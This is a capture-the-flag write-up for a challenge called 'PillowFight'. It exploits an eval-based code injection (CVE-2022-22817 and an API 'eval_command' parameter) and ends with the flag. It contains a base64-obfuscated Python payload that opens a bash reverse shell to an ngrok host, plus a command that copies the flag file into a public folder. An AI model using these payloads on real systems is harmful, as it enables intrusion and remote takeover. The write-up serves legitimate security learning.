# PillowFight

![image](https://github.com/user-attachments/assets/786886d8-46b5-4f30-ae01-a7491f207913)

## My Solution

![image](https://github.com/user-attachments/assets/b7c002e4-f347-4d31-8c47-8e16b37f30ce)

We can see that the app is using Python Pillow 8.4.0 which we know has an exploit where we could execute code because it would be passing it to an eval statement ([CVE-2022-22817](https://github.com/advisories/GHSA-8vj2-vxx3-667w)):  

![image](https://github.com/user-attachments/assets/5db1febc-e0c4-496c-89da-9fe2180c3a0b)

We also have access to the API docs which unlike the functionality on the main page, takes an additional argument of "eval_command"... very handy, we don't even need the vulnerable Pillow I guess:  

![image](https://github.com/user-attachments/assets/c2b6d7f9-c275-4c0c-b652-f95c5f2b4540)

Within that eval_command argument we can pass a payload like this to get a reverse shell:  

```python
__import__('os').system("echo YmFzaCAtaSAgPiYgL2Rldi90Y3AvMC50Y3AuZXUubmdyb2suaW8vMTU4NzUgIDA+JjE=|base64 -d|bash")
```
![image](https://github.com/user-attachments/assets/7e1fd411-f3d0-40fa-acd9-35119ae158b0)

Or, because there is no curl, wget or netcat:  

![image](https://github.com/user-attachments/assets/15573149-b40d-4445-b1b8-09c641e4a9ad)

We could make a static folder and copy the flag there:  

```python
__import__('os').system("mkdir static && cp flag.txt static/")
```

![image](https://github.com/user-attachments/assets/34dfd27a-86a4-41b9-ba25-343009ee5d3f)

Either way, we get the flag.

`flag{b6b62e6c5cdfda3b3a8b87d90fd48d01}`
